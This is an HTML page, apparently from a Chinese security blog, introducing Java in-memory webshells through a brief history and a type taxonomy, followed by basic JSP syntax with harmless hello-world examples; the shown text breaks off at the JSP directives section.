@@ -1,0 +1,257 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
+  Java 内存马之内存马介绍
+  #
+
+
+  内存马简史
+  #
+
+现在的各种防御措施越来越多，文件 shell 大部分都已经消失了，而内存马因其隐蔽性等优点从而越来越盛行。
+其实内存马由来已久，在 17 年的Tomcat 源代码调试笔记 - 看不见的 Shell这篇文章中就已经初见端倪，但是一直不温不火，后来经过使用agent技术加持后，扩展了内存马的使用场景，然而还是停留在奇技淫巧上。在后来各种 HVV 之后，文件 webshell 已经逐渐消失，内存马开始被大众重视。在之前的 shiro 回显研究之后，无数安全研究人员开始对内存马进行研究，其中出现像 LandGrey 大佬构造的 Spring Controller 内存马。从此内存马逐步发展出三种类型：
+
+servlet-api 型
+
+Filter 型
+Servlet 型
+
+
+Spring 类
+
+拦截器
+Controller 型
+
+
+Java Instrumentation 类
+
+agent 型
+
+
+
+
+  JSP 基础
+  #
+
+
+  什么是 JSP
+  #
+
+JSP（Java Server Pages），是 Java 的一种动态网页技术。在早期 Java 的开发技术中，Java 程序员如果想要向浏览器输出一些数据，就必须得手动println一行行的HTML代码。为了解决这一繁琐的问题，Java开发了 JSP 技术。
+JSP 可以看作一个 Java Servlet，主要用于实现 Java web 应用程序的用户界面部分。网页开发者们通过结合 HTML 代码、XHTML 代码、XML元素以及嵌入 JSP 操作和命令来编写 JSP。"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/"><meta property="og:site_name" content="Solowalker"><meta property="og:title" content="Java 内存马之内存马介绍"><meta property="og:description" content="Java 内存马之内存马介绍 # 内存马简史 # 现在的各种防御措施越来越多，文件 shell 大部分都已经消失了，而内存马因其隐蔽性等优点从而越来越盛行。
+其实内存马由来已久，在 17 年的Tomcat 源代码调试笔记 - 看不见的 Shell这篇文章中就已经初见端倪，但是一直不温不火，后来经过使用agent技术加持后，扩展了内存马的使用场景，然而还是停留在奇技淫巧上。在后来各种 HVV 之后，文件 webshell 已经逐渐消失，内存马开始被大众重视。在之前的 shiro 回显研究之后，无数安全研究人员开始对内存马进行研究，其中出现像 LandGrey 大佬构造的 Spring Controller 内存马。从此内存马逐步发展出三种类型：
+servlet-api 型 Filter 型 Servlet 型 Spring 类 拦截器 Controller 型 Java Instrumentation 类 agent 型 JSP 基础 # 什么是 JSP # JSP（Java Server Pages），是 Java 的一种动态网页技术。在早期 Java 的开发技术中，Java 程序员如果想要向浏览器输出一些数据，就必须得手动println一行行的HTML代码。为了解决这一繁琐的问题，Java开发了 JSP 技术。
+JSP 可以看作一个 Java Servlet，主要用于实现 Java web 应用程序的用户界面部分。网页开发者们通过结合 HTML 代码、XHTML 代码、XML元素以及嵌入 JSP 操作和命令来编写 JSP。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-10-16T00:00:00+00:00"><meta property="article:modified_time" content="2026-10-16T00:00:00+00:00"><title>Java 内存马之内存马介绍 | Solowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/><link rel=stylesheet href=/book.min.bef206ca73466d23b093d88913fd40ccba55f422e1e51ed680a9e04a58cdc341.css integrity="sha256-vvIGynNGbSOwk9iJE/1AzLpV9CLh5R7WgKngSljNw0E=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.76f0e54ef0d662ebbc33368feeb1fb0af6744a82e06d882059b55bc072a581a1.js integrity="sha256-dvDlTvDWYuu8MzaP7rH7CvZ0SoLgbYggWbVbwHKlgaE=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><img src=/images/logo/solowalker.png alt=Logo class=top-header-logo>
+<a href=https://s0lowalker.github.io/ class=top-header-title>Solowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/images/logo/solowalker.png alt=Logo class=book-icon><span>Solowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-f3baf843ac4871d7cc6c9747f091d4ee class=toggle checked>
+<label for=section-f3baf843ac4871d7cc6c9747f091d4ee class="flex justify-between"><a role=button>Java攻防</a></label><ul><li><input type=checkbox id=section-94cb9c321d608771dba7d61d7bff1f9f class=toggle checked>
+<label for=section-94cb9c321d608771dba7d61d7bff1f9f class="flex justify-between"><a role=button>内存马篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/ class=active>Java 内存马之内存马介绍</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%AF%87/>Java 内存马之基础篇</a></li></ul></li><li><input type=checkbox id=section-40df731824a253d5840b20b53d52c2ba class=toggle>
+<label for=section-40df731824a253d5840b20b53d52c2ba class="flex justify-between"><a role=button>EL表达式</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/el-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/>EL 表达式注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/>SpEL表达式注入</a></li></ul></li><li><input type=checkbox id=section-f40d137f7e26fb2fcb23fda5a456c204 class=toggle>
+<label for=section-f40d137f7e26fb2fcb23fda5a456c204 class="flex justify-between"><a role=button>Weblogic篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ssrf/>Weblogic 弱口令&文件上传&amp;SSRF</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-jndi-%E6%B3%A8%E5%85%A5/>Weblogic JNDI 注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic T3 反序列化分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic XMLDecoder反序列化</a></li></ul></li><li><input type=checkbox id=section-f4bd766ffc2c2c4a5fca527ebb421aba class=toggle>
+<label for=section-f4bd766ffc2c2c4a5fca527ebb421aba class="flex justify-between"><a role=button>Log4j2篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/log4j2%E7%AF%87/log4shell/>Log4shell</a></li></ul></li><li><input type=checkbox id=section-ed10ff85653d7364765d5831a959b09b class=toggle>
+<label for=section-ed10ff85653d7364765d5831a959b09b class="flex justify-between"><a role=button>Fastjson反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.62-1.2.68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/>Fastjson1.2.62-1.2.68反序列化漏洞</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/>Fasjson各版本绕过</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>Fastjson1.2.24漏洞分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%9F%BA%E7%A1%80/>Fastjson基础</a></li></ul></li><li><input type=checkbox id=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class=toggle>
+<label for=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class="flex justify-between"><a role=button>Shiro反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro721/>Shiro721</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro550/>Shiro550</a></li></ul></li><li><input type=checkbox id=section-db4f1366364f6e3bdeccbe9d6728217c class=toggle>
+<label for=section-db4f1366364f6e3bdeccbe9d6728217c class="flex justify-between"><a role=button>Java反序列化之CC链</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc11/>java反序列化之CC11</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>Java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/>Java常规漏洞</a></li></ul></li><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/spring%E5%BC%80%E5%8F%91/>Spring开发</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jndi/>JNDI</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li></ul></li><li><input type=checkbox id=section-044b235faa94474d25fd6dc85c615699 class=toggle>
+<label for=section-044b235faa94474d25fd6dc85c615699 class="flex justify-between"><a role=button>RASP</a></label><ul><li><a href=/docs/rasp/rasp2%E5%AE%9E%E7%8E%B0%E5%9F%BA%E6%9C%AC%E6%8B%A6%E6%88%AA/>RASP(2)——实现基本拦截</a></li><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%911%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%B7%91%E9%80%9A%E7%9A%84javaagent/>RASP开发(1)——第一个跑通的 Java Agent</a></li><li><a href=/docs/rasp/rasp%E5%9F%BA%E7%A1%80/>RASP基础</a></li></ul></li><li><input type=checkbox id=section-c4d784444933fdccb12cc39e2ab0a411 class=toggle>
+<label for=section-c4d784444933fdccb12cc39e2ab0a411 class="flex justify-between"><a role=button>渗透测试</a></label><ul><li><input type=checkbox id=section-42c6aa109fe86285746031b39529fd8c class=toggle>
+<label for=section-42c6aa109fe86285746031b39529fd8c class="flex justify-between"><a role=button>web开发篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/javaee/>JavaEE</a></li><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/js%E5%BA%94%E7%94%A8/>JS应用</a></li></ul></li><li><input type=checkbox id=section-6f168133498c5817b23bc8b547002dba class=toggle>
+<label for=section-6f168133498c5817b23bc8b547002dba class="flex justify-between"><a role=button>基础入门篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/web%E4%B8%8Eapp%E4%B8%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F/>Web、APP与小程序架构基础</a></li></ul></li></ul></li><li><input type=checkbox id=section-326ea580ca38728d53e273bd1a79dd29 class=toggle>
+<label for=section-326ea580ca38728d53e273bd1a79dd29 class="flex justify-between"><a role=button>Nodejs安全</a></label><ul><li><a href=/docs/nodejs%E5%AE%89%E5%85%A8/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>Node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Java 内存马之内存马介绍</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#内存马简史>内存马简史</a></li><li><a href=#jsp-基础>JSP 基础</a><ul><li><a href=#什么是-jsp>什么是 JSP</a></li><li><a href=#jsp-语法>JSP 语法</a></li></ul></li><li><a href=#传统内存马>传统内存马</a></li><li><a href=#tomcat-中的三个-context-的理解>Tomcat 中的三个 Context 的理解</a><ul><li><a href=#context>Context</a></li><li><a href=#servletcontext>ServletContext</a></li><li><a href=#applicationcontext>ApplicationContext</a></li><li><a href=#standardcontext>StandardContext</a></li><li><a href=#tomcat-三个-context-的总结>Tomcat 三个 Context 的总结</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=java-内存马之内存马介绍>Java 内存马之内存马介绍
+<a class=anchor href=#java-%e5%86%85%e5%ad%98%e9%a9%ac%e4%b9%8b%e5%86%85%e5%ad%98%e9%a9%ac%e4%bb%8b%e7%bb%8d>#</a></h1><h2 id=内存马简史>内存马简史
+<a class=anchor href=#%e5%86%85%e5%ad%98%e9%a9%ac%e7%ae%80%e5%8f%b2>#</a></h2><p>现在的各种防御措施越来越多，文件 shell 大部分都已经消失了，而内存马因其隐蔽性等优点从而越来越盛行。</p><p>其实内存马由来已久，在 17 年的<a href=https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw>Tomcat 源代码调试笔记 - 看不见的 Shell</a>这篇文章中就已经初见端倪，但是一直不温不火，后来经过使用<a href=https://www.cnblogs.com/rebeyond/p/9686213.html>agent技术</a>加持后，扩展了内存马的使用场景，然而还是停留在奇技淫巧上。在后来各种 HVV 之后，文件 webshell 已经逐渐消失，内存马开始被大众重视。在之前的 shiro 回显研究之后，无数安全研究人员开始对内存马进行研究，其中出现像 LandGrey 大佬构造的 Spring Controller 内存马。从此内存马逐步发展出三种类型：</p><ol><li>servlet-api 型<ul><li>Filter 型</li><li>Servlet 型</li></ul></li><li>Spring 类<ul><li>拦截器</li><li>Controller 型</li></ul></li><li>Java Instrumentation 类<ul><li>agent 型</li></ul></li></ol><h2 id=jsp-基础>JSP 基础
+<a class=anchor href=#jsp-%e5%9f%ba%e7%a1%80>#</a></h2><h3 id=什么是-jsp>什么是 JSP
+<a class=anchor href=#%e4%bb%80%e4%b9%88%e6%98%af-jsp>#</a></h3><p>JSP（Java Server Pages），是 Java 的一种动态网页技术。在早期 Java 的开发技术中，Java 程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了 JSP 技术。</p><p>JSP 可以看作一个 Java Servlet，主要用于实现 Java web 应用程序的用户界面部分。网页开发者们通过结合 HTML 代码、XHTML 代码、XML元素以及嵌入 JSP 操作和命令来编写 JSP。</p><p>当第一次访问 JSP 页面时，Tomcat 服务器会将 JSP 页面翻译成一个 java 文件，并将其编译为<code>.class</code>文件。JSP 通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p><h3 id=jsp-语法>JSP 语法
+<a class=anchor href=#jsp-%e8%af%ad%e6%b3%95>#</a></h3><h4 id=脚本程序>脚本程序
+<a class=anchor href=#%e8%84%9a%e6%9c%ac%e7%a8%8b%e5%ba%8f>#</a></h4><p>脚本程序可以包含任意量的 Java 语句、变量、方法或表达式，只要它们在脚本语言中是有效的。脚本程序格式：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;% 代码片段 %&gt;
+</code></pre><p>比如：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;html&gt;  
+&lt;body&gt;  
+&lt;h2&gt;Hello World!!!&lt;/h2&gt;  
+&lt;% out.println(&#34;GoodBye!&#34;); %&gt;  
+&lt;/body&gt;  
+&lt;/html&gt;
+</code></pre><h4 id=jsp-声明>JSP 声明
+<a class=anchor href=#jsp-%e5%a3%b0%e6%98%8e>#</a></h4><p>一个声明语句可以声明一个或多个变量、方法，供后面的 Java 代码使用。JSP 声明语句格式：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%! 声明  %&gt;
+</code></pre><p>等价于下面的 XML：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;jsp:declaration&gt;</span>   
+</span></span><span style=display:flex><span>代码片段
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/jsp:declaration&gt;</span>
+</span></span></code></pre></div><p>示例：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;html&gt;
+&lt;body&gt;
+&lt;h2&gt;Hello World!!!&lt;/h2&gt;
+&lt;%! String s= &#34;GoodBye!&#34;; %&gt;
+&lt;% out.println(s); %&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h4 id=jsp-表达式>JSP 表达式
+<a class=anchor href=#jsp-%e8%a1%a8%e8%be%be%e5%bc%8f>#</a></h4><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%= 表达式 %&gt;
+</code></pre><p>等价于下面的 XML：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;jsp:expression&gt;</span>表达式<span style=color:#f92672>&lt;/jsp:expression&gt;</span>
+</span></span></code></pre></div><p>示例：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;html&gt;
+&lt;body&gt;
+&lt;h2&gt;Hello World!!!&lt;/h2&gt;
+&lt;p&gt;&lt;% String name = &#34;Drunkbaby&#34;; %&gt;username:&lt;%=name%&gt;&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h4 id=jsp-指令>JSP 指令
